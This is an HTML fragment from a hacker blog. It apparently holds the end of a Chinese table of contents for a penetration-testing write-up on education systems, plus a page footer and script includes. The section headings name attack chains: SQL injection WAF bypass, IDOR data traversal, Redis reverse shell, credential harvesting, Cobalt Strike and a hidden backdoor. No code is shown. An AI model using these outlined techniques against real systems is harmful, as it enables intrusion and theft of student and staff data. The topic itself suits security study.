href="#0x06-Nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E2%80%94%E2%80%94%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%E9%93%BE%E5%BC%8F%E5%88%A9%E7%94%A8%E4%B8%8E%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BB%98%E8%B4%B9%E6%9C%8D%E5%8A%A1%E6%BB%A5%E7%94%A8"><span class="toc-article-text">0x06 Nacos 未授权访问——配置泄露链式利用与第三方付费服务滥用</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x07-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%85%A8%E9%93%BE%E8%B7%AF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E2%80%94%E2%80%94%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB%E9%A9%B1%E5%8A%A8%E4%B8%93%E9%A1%B9%E7%AA%81%E7%A0%B4%E4%B8%8E%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%89%B9%E9%87%8F%E9%81%8D%E5%8E%86"><span class="toc-article-text">0x07 微信小程序全链路漏洞挖掘——框架识别驱动专项突破与敏感数据批量遍历</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x08-%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E7%BB%84%E5%90%88%E6%8B%B3%E2%80%94%E2%80%94%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4-SQL-%E6%B3%A8%E5%85%A5-WAF-%E7%BB%95%E8%BF%87-%E6%8E%A5%E5%8F%A3%E8%B6%8A%E6%9D%83%E9%80%9A%E6%9D%80"><span class="toc-article-text">0x08 教育系统组合拳——弱口令爆破 + SQL 注入 WAF 绕过 + 接口越权通杀</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x09-%E6%96%B0%E8%AF%81%E4%B9%A6%E7%AB%99%E6%8A%A2%E6%97%B6%E9%97%B4%E6%8C%96%E6%B4%9E%E2%80%94%E2%80%94heapdump-%E6%B3%84%E9%9C%B2%E6%95%99%E5%B8%88%E4%BF%A1%E6%81%AF-%E2%86%92-%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E6%A8%AA%E5%90%91%E7%AA%81%E7%A0%B4-%E2%86%92-%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E9%81%8D%E5%8E%86"><span class="toc-article-text">0x09 新证书站抢时间挖洞——heapdump 泄露教师信息 → 默认密码横向突破 → 学生管理系统越权遍历</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x0A-%E4%B8%80%E7%AB%99%E5%BC%8F%E9%97%A8%E6%88%B7-IDOR-%E8%B6%8A%E6%9D%83%E2%80%94%E2%80%94userid-%E6%98%8E%E6%96%87%E5%8F%82%E6%95%B0%E9%81%8D%E5%8E%86-%E6%95%99%E5%B8%88%E4%BF%A1%E6%81%AF%E6%89%B9%E9%87%8F%E6%B3%84%E9%9C%B2"><span class="toc-article-text">0x0A 一站式门户 IDOR 越权——userid 明文参数遍历 + 教师信息批量泄露</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x0B-%E5%B0%B1%E4%B8%9A%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-SQL-%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%BB%9F%E8%AE%A1%E5%8A%9F%E8%83%BD%E5%BC%82%E5%B8%B8%E6%8A%A5%E9%94%99%E8%A7%A6%E5%8F%91-Oracle-%E6%95%B0%E6%8D%AE%E5%BA%93-shell-%E8%8E%B7%E5%8F%96"><span class="toc-article-text">0x0B 就业管理平台 SQL 注入——统计功能异常报错触发 + Oracle 数据库 shell 获取</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x0C-%E5%BE%AE%E4%BF%A1%E7%94%9F%E6%80%81%E8%AF%81%E4%B9%A6%E7%AB%99%E8%B6%8A%E6%9D%83%E2%80%94%E2%80%94UA-%E4%BC%AA%E8%A3%85%E7%BB%95%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%99%90%E5%88%B6-openid-%E5%93%8D%E5%BA%94%E4%BC%AA%E9%80%A0%E7%AA%81%E7%A0%B4%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95"><span class="toc-article-text">0x0C 微信生态证书站越权——UA 伪装绕过客户端限制 + openid 响应伪造突破后台登录</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x0D-EDU-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94H3C-telnet-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E2%86%92-NAT-%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E6%89%93%E7%82%B9-%E2%86%92-Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%8F%8D%E5%BC%B9-%E2%86%92-%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8%E6%A8%AA%E5%90%91%E6%8B%BF%E4%B8%8B%E4%BA%A4%E6%8D%A2%E6%9C%BA"><span class="toc-article-text">0x0D EDU 内网攻防——H3C telnet 弱口令 → NAT 端口映射打点 → Redis 未授权反弹 → 密码复用横向拿下交换机</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x10-WebVPN-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E2%80%94%E2%80%94Google-Hack-%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E5%B8%88%E7%94%9F%E5%87%AD%E6%8D%AE-URL-%E8%A7%84%E5%88%99%E9%80%86%E5%90%91%E5%85%A8%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B-%E5%AE%9D%E5%A1%94%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%B8%8A%E7%BA%BF-CS"><span class="toc-article-text">0x10 WebVPN 内网穿透——Google Hack 批量获取师生凭据 + URL 规则逆向全端口探测 + 宝塔弱口令上线 CS</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x0F-%E5%90%8E%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E9%93%BE%E2%80%94%E2%80%94%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%9B%B4%E5%8F%96%E8%B6%85%E7%AE%A1-%E2%86%92-Cookie-%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E6%9D%83%E9%99%90%E6%8B%A6%E6%88%AA-%E2%86%92-%E5%88%A0%E9%99%A4%E8%B4%A6%E5%8F%B7%E4%B8%8D%E5%A4%B1%E6%95%88%E7%9A%84%E9%9A%90%E5%BD%A2%E5%90%8E%E9%97%A8"><span class="toc-article-text">0x0F 后勤管理系统漏洞链——弱口令直取超管 → Cookie 替换绕过前端权限拦截 → 删除账号不失效的隐形后门</span></a></li></ol>
+			</div>
+		
+		</div>
+	</div>
+
+</div><!-- col-md-3 -->
+
+
+		</div>
+
+		
+
+	</div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 ZQ-Rookie-Hacker's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/toc.js"></script>
+<script src="/js/copy-code.js"></script>
+
+   <script type="text/javascript">
+     var searchPath = "/search.xml";
+   </script>
+
+
+<script src="/js/search.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+</body>
+   </html>
